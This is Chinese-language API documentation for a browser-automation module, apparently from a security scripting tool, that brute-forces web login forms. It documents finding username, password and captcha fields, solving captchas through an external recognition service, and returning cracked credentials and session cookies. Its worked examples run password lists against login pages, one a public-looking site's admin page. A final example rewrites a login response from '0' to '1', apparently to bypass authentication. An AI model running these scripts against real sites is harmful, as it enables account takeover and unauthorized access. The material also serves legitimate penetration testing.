# simulator模块使用说明：

开始模拟网页爆破等通用行为时

### 初始化时使用

`pack = simulator.Page()`

### 初始化页面模块

模块可选设置参数包括：

`pack.SetURL(url string)` 设置目标url 必需

`pack.SetProxy(proxyUrl string)` 或 

`pack.SetProxy(proxyUrl string,username string,password string)`设置代理

完成设置后 通过

`page = pack.Create()`

完成页面创建

### page包含以下方法：

`element = page.FindElement(keyword string)`

`elements = page.FindElements(keyword string)`

通过tag、selector路径等关键词发现页面中的元素 FindElement为发现第一个，FindElement为发现所有关键词元素
- - -
`element = page.GeneralFindElement(keyword string)`

`elements = page.GeneralFindElements(keyword string)`

通过tag发现页面中的广义元素，这里特指且目前仅实现了button，因为button不仅包括tag为button的元素， 还包括了tag为input，type为submit或button的元素，为了一次性发现所有button不需要多次描述 所以写了这个方法

除了button这个keyword之外其余和`page.FindElement(keyword string)` `page.FindElements(keyword string)`没有区别
- - -
`err = page.StartListen()`

`string, err = page.StopListen()`

对页面中发生的元素变化进行监听，在`page.StartListen()`后执行相关动作后，使用`string, err = page.StopListen()`发现动作产生的页面元素变化的字符串

注意当发生页面跳转时结果为空
- - -
`page.Click(elementSelector string)` 点击页面中的对应selector位置下的element

`page.Input(elementSelector string， inputStr string)` 在页面对应selector位置下的元素进行字符串输入

`page.Screenshot(filePath string)` 对当前页面进行截屏，按照指定路径进行保存

`string = page.CurrentURL()` 获取当前页面的url

### 组页面元素elements包含以下方法：

`elements = elements.FilteredKeywordElements(keyword string)`

`element = elements.FilteredKeywordElement(keyword string)`

通过页面元素的各种属性 根据keyword的关键词进行筛选 但是两个方法所使用的筛选方法有所区别

其中`elements.FilteredKeywordElements`方法通过关键词包含方法 只要包括这个关键词就认为其为对应类别

而`elements.FilteredKeywordElement`方法会计算相似程度 得出所有元素中与该类别最为对应的一个元素

目前过滤关键词包括"username"，"password"，"captcha"，"login"。

- - -

`element = elements.First()` 返回元素组的第一个元素

`element = elements.Last()` 返回元素组的最后一个元素

`bool = elements.Single()` 判断元素组中是否只包含一个元素

`bool = elements.Multi()` 判断元素组是否包含多个元素

`bool = elements.Empty()` 判断元素组是否为空

`int = elements.Length()` 返回元素组长度

### 单个页面元素element包含以下方法：

`element = element.GetElement(keyword string)`

`elements = element.GetElements(keyword string)`

`element = element.GeneralGetElement(keyword string)`

`elements = element.GeneralGetElements(keyword string)`

发现页面元素中的对应关键词元素 这里与`page.FindElment(keyword string)`等方法类似
- - -

`string,err = element.GetAttribute(keyword string)` 获得页面元素的对应attribute属性值

`string,err = element.GetProperty(keyword string)` 获得页面元素对应的对应property属性值

`bool = element.CheckDisplay()` 确定该页面元素是否显示

`element = element.GetParent()` 获得该页面元素的父元素
- - -
`element = element.GetLatestElement(keyword string, maxLevel int)`

`element = element.GeneralGetLatestElement(keyword string, maxLevel int)`

在所有上层页面元素中找到与该元素最近的某关键词元素，其中maxLevel为最大向上溯源层数。该方法作用在发现验证码输入框后找到距离该输入框最近的图片，以此作为验证码图片，或者是在找到密码框之后去寻找距离最近的button作为登录按钮

`element.GeneralGetLatestElement()`与之前
`elements = page.GeneralFindElements(keyword string)`类似
- - -
`element.Click()` 点击对应元素

`element.Input(inputStr string)` 在对应元素输入字符串

`err = element.Redirect()`

由于在发生页面跳转时会出现元素丢失请客，这里`element.Redirect()`方法会根据元素的selector重新寻找元素

# 验证码模块使用说明

`captchaModule = simulator.Captcha()` 初始化验证码识别模块

`captchaModule.SetIdentifyUrl(url string)` 输入验证码识别接口url

`string,err = captchaModule.Detect(element element)` 对指定element进行验证码识别
- - -
`captchaModule.SetRequestStruct(req requestStructor)`

`captchaModule.SetResponseStruct(resp responseStructor)`

`captchaModule.SetIdentifyMode(mode string)`

此处是设置验证码识别模块的输入结构、输出结构和扫描模式（类似字符、计算等） 此处通过接口限制

其中输入结构包括以下两个函数接口

`InputMode(string)` 输入验证码扫描模式

`InputBase64(string)` 输入图片对应base64编码

`GetBase64() string` 获得输入的base64编码


输出结构包括以下三个函数接口

`GetResult() string` 获得验证码识别结果

`GetErrorInfo() string` 获得识别错误信息

`GetSuccess() bool` 获得验证码识别是否成功


当不进行输入时，则使用默认结构：

    type CaptchaRequest struct {
        Project_name string `json:"project_name"`
        Image        string `json:"image"`
    }
    
    func (req *CaptchaRequest) InputBase64(b64 string) {
        req.Image = b64
    }

    func (req *CaptchaRequest) InputMode(mode string) {
        req.Project_name = mode
    }
    
    func (req *CaptchaRequest) GetBase64() string {
        return req.Image
    }
    
    type CaptchaResult struct {
        Uuid    string `json:"uuid"`
        Data    string `json:"data"`
        Success bool   `json:"success"`
    }
    
    func (resp *CaptchaResult) GetResult() string {
        return resp.Data
    }
    
    func (resp *CaptchaResult) GetErrorInfo() string {
        return resp.Data
    }
    
    func (resp *CaptchaResult) GetSuccess() bool {
        return resp.Success
    }

# 示例爆破代码

    url = "https://www.jansh.com.cn/admin/login.php"
    pack = simulator.Page()
    pack.SetURL(url)
    page = pack.Create()
    
    // 获取所有input
    elements,_ = page.FindElements("input")
    // 通过关键词筛选获取username输入框和password输入框
    userelement = elements.FilteredKeywordElement("username")
    pwdelement = elements.FilteredKeywordElement("password")
    
    // 通过selector路径找到验证码element
    // 如果关键词发现元素出现偏差可用此方法手动发现
    capelement,_ = page.FindElement("#login_box > form > li:nth-child(3) > input[type=text]")
    // 寻找与该验证码最近的图片 为验证码图片
    capimgele,_ = capelement.GetLatestElement("img", 3)
    
    // 寻找广义button 此处button的标签为input 所以通过page.FindElements("button")会找不到
    buttons,_=page.GeneralFindElements("button")
    // 关键词筛选登录框
    button = buttons.FilteredKeywordElement("login")
    
    // 验证码模块
    capmode = simulator.Captcha()
    capmode.SetIdentifyUrl("http://x.x.x.x:xxxxx/runtime/text/invoke")
    capmode.SetIdentifyMode("common_alphanumeric")
    
    users = ["admin"]
    pwds = ["admin","123321"]
    for _,u = range users{
        for _,p = range pwds{    
            println(u,p)
            // 在页面变化后可能出现元素丢失 所以执行Redirect()方法后再输入用户名密码
            // 如果确定页面在登录成功前不会跳转则无需执行该方法 此处为示例
            userelement.Redirect()
            userelement.Input(u)
            pwdelement.Redirect()
            pwdelement.Input(p)

            // 识别验证码
            capimgele.Redirect()
            result,_ = capmode.Detect(capimgele)
            capelement.Redirect()
            capelement.Input(result)

            //点击前监听页面变化
            page.StartListen()
            button.Click()
            word,_ = page.StopListen()
            println(word, page.Url())
            time.sleep(3)
        }
    }

# 自动化爆破说明

## 爆破输入

`BruteForceResult, err = simulator.defaultBrute(targetUrl, ...ConfigOpt)`

对目标url进行爆破 返回爆破结果和错误信息

爆破模块相关参数通过ConfigOpt进行输入：

- `configOpt = simulator.captchaUrl(captchaUrl string)` 设置验证码识别url

- `configOpt = simulator.captchaMode(captchaMode string)` 设置验证码识别模式

输入包括 common_alphanumeric 通用英数, common_arithmetic 通用算术, common_slider 通用滑块; 默认为通用英数

- `configOpt = simulator.usernameList(usernameList []string)` 设置爆破的用户名列表

- `configOpt = simulator.passwordList(passwordList []string)` 设置爆破的密码列表

- `configOpt = simulator.wsAddress(wsAddress string)` 设置远端chrome浏览器的ws地址

- `configOpt = simulator.proxy(proxy string)` 设置浏览器代理地址

- `configOpt = simulator.proxyDetails(proxy, username, password string)` 设置浏览器代理地址和代理的用户名密码

## 爆破输出

BruteForceResult包括如下输出：

- `string = BruteForceResult.Username()` 爆破成功的用户名，失败为空

- `string = BruteForceResult.Password()` 爆破成功的密码，失败为空

- `string = BruteForceResult.Cookie()` 爆破成功的cookie，失败为空

- `string = BruteForceResult.LoginPngB64()` 爆破成功页面截图的base64编码，失败为空

- `[]string = BruteForceResult.Log()` 爆破过程中的日志信息，字符串列表格式

# 自动化爆破示例

    url = "http://192.168.0.68/#/login"
    userlist = ["admin"]
    passlist = ["admin","luckyadmin123"]
    userOpt = simulator.usernameList(userlist)
    passOpt = simulator.passwordList(passlist)
    scanMode = simulator.captchaMode("common_arithmetic")
    chromeAddress = simulator.wsAddress("http://192.168.0.115:7317/")
    result, err = simulator.defaultBrute(url, userOpt, passOpt, scanMode, chromeAddress)
    
    println(result.Username())
    println(result.Password())
    println(result.Cookie())
    println(result.Log())


# simulator.simple

新增simulator.simple接口

相比于之前复杂的操作，对接口进行简化

## api

### func

`simulator.simple.createBrowser(opts ...BrowserConfigOpt) *Browser` 根据参数创建浏览器，并完成初始化

其中 浏览器的参数设置如下：

`simulator.simple.wsAddress(wsAddress string) BrowserConfigOpt` 设置远程浏览器地址

`simulator.simple.proxy(proxy string, proxyInfo ...string) BrowserConfigOpt` 设置浏览器代理
- proxy为代理地址，必填
- proxyInfo为代理的用户名和密码，选填

`simulator.simple.noSandBox(bool) BrowserConfigOpt` 设置no-sandbox

`simulator.simple.headless(bool) BrowserConfigOpt` 设置headless

`simulator.simple.requestModify(url string, modifyTarget ModifyTarget, mofidyResult interface{}) BrowserConfigOpt` 设置需要修改的request包
- url为需要修改包内容对应的请求url中的关键字，支持正则
- modifyTarget为修改的位置 包括：
  - `simulator.simple.headersModifyTarget` 对请求包的headers进行添加操作
  - `simulator.simple.hostModifyTarget` 对请求包的host进行修改操作
  - `simulator.simple.bodyModifyTarget` 对请求包的body进行直接修改操作
- modifyResult为修改的具体内容，内容的结构会随着modifyTarget的不同而不同：
  - 对请求包的headers进行添加操作时，modifyResult可以是[]string结构，也可以是map[string]string结构。
    - 当modifyResult结构是[]string时，切片从头开始两个字符串为一组，一组中第一个字符串为headers的key，第二个字符串为headers的value，例如[]string{"testHeaders", "testValue"}
    - 当modifyResult结构是map[string]string时，map结构中的key为headers的key，结构中的value为headers的value，例如map[string]string{"testHeaders":"testValue"}
  - 对请求包的host进行修改操作时，modifyResult为string类型，内容是所要修改成为的host
  - 对请求包的body进行直接修改操作时，modifyResult为string类型，内容是所要修改成为的body

`simulator.simple.responseModify(url string, modifyTarget ModifyTarget, mofidyResult interface{}) BrowserConfigOpt` 设置需要修改的response包
- url为需要修改包内容对应的请求url中的关键字，支持正则
- modifyTarget为修改的位置 包括：
    - `simulator.simple.headersModifyTarget` 对响应包的headers进行添加操作
    - `simulator.simple.bodyModifyTarget` 对响应包的body进行直接修改操作
    - `simulator.simple.bodyReplaceTarget` 对响应包的body进行替换操作
- modifyResult为修改的具体内容，内容的结构会随着modifyTarget的不同而不同：
  - 对响应包的headers进行添加操作时，modifyResult结构同请求包中headers进行添加操作时的modifyResult的结构
  - 对响应包的body进行直接修改操作时，modifyResult为string类型，内容是所要修改成为的body
  - 对响应包的body进行替换操作时，modifyResult为[]string类型，切片从头开始两个字符串为一组，一组中第一个字符串为body中待替换的字符串，第二个字符串为其对应被替换成的字符串

### type Browser func

`func (b *Browser) Navigate(urlStr string) *Page` 创建一个页面并访问指定的url，返回该页面

### type Page func

`func (p *Page) Navigate(urlStr string)` 使该页面访问指定url

`func (p *Page) Click(selector string) error` 点击页面中selector对应元素

`func (p *Page) Input(selector, inputStr string) error` 在页面中的selector对应元素中输入参数

`func (p *Page) HTML() (string, error)` 返回当前页面的HTML代码

`func (p *Page) ScreenShot() (string, error)` 返回当前页面截图的base64编码

## simulator.simple Yak代码示例

    replaceStr = []string{"0","1"}
    replaceModify = simulator.simple.responseModify("uapws/login.ajax", simulator.simple.bodyReplaceTarget, replaceStr)
    headless = simulator.simple.headless(false)
    browser = simulator.simple.createBrowser(headless, replaceModify)
    page = browser.Navigate("http://192.168.0.111:8099/uapws/")
    page.Input("#password", "123321")
    page.Click("#dijit_form_Button_0_label")
    time.Sleep(2)
